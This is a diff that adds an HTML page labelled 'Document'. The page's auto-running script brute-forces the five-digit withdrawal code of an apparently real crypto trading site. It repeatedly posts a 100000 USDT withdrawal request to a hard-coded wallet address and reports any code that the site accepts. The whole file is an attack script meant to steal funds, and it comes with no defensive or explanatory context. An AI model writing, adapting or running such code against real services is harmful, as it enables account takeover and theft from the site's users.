@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <h1>Hello</h1>
+  </body>
+  <script>
+    const API_URL =
+      "https://pipsflow.net/dashboard/database/withdraw_query.php";
+
+    const baseFormData = {
+      withdraw_type: "Usdt",
+      btc_address: "",
+      Usdt_address: "TRuVwH1mNtkdytfTJkiaZPensPGdPCTFRn",
+      ethereum_address: "",
+      bank_name: "",
+      acct_no: "",
+      acct_name: "",
+      acct_swift: "",
+      amount: 100000,
+    };
+
+    // Function to pad numbers to 5 digits (e.g., 00001)
+    const padNumber = (num) => String(num).padStart(5, "0");
+
+    // Function to make POST requests
+    const makePostRequest = async (password) => {
+      try {
+        const form = new FormData();
+        Object.entries({
+          ...baseFormData,
+          with_code: password,
+        }).forEach(([key, value]) => {
+          form.append(key, value);
+        });
+
+        const response = await fetch(API_URL, {
+          method: "POST",
+          body: form,
+        });
+
+        const data = await response.text();
+        console.log(`Trying password: ${password}`, data);
+
+        // Check for success (adjust based on actual response content)
+        if (response.ok && data.includes("Success")) {
+          console.log(`Successful password found: ${password}`);
+          alert(`Password found: ${password}`);
+          return true;
+        }
+      } catch (error) {
+        console.error(`Error with password ${password}:`, error);
+      }
+
+      return false;
+    };
+
+    // Main function to iterate over all passwords
+    const bruteForce = async () => {
+      console.log("Starting brute force...");
+      for (let i = 99998; i <= 99999; i++) {
+        const password = padNumber(i);
+        const isSuccess = await makePostRequest(password);
+        if (isSuccess) {
+          console.log("Password found! Exiting...");
+          break;
+        }
+      }
+      console.log("Brute force completed.");
+    };
+
+    // Start the brute force process
+    bruteForce();
+  </script>
+</html>
